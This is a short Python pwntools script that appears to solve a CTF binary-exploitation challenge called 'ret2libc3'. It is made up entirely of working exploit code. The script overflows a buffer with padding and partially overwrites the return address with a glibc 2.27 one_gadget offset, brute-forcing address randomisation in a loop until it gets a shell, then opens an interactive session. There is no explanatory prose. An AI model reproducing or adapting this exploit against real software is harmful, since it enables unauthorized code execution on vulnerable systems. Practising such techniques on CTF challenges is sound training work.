#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

elf = ELF('./ret2libc3')

one_gadget = '\xfc\xa2\x50' #patchelf 0x10a2fc [rsp+0x70] == NULL glibc2.27-1.6
#one_gadget = '\xfc\xf2\x74' #实际环境
while True:
	try:
		p = process('./ret2libc3')
		#gdb.attach(p)
		#pause()
		p.recvuntil("Please pwn me :)\n")
		payload = 'A'*0x38 + one_gadget
		p.send(payload)
	
		p.sendline("ls")
		ret = p.recv()
		if not ret:
			p.close()
		p.interactive()
	except:
		p.close()
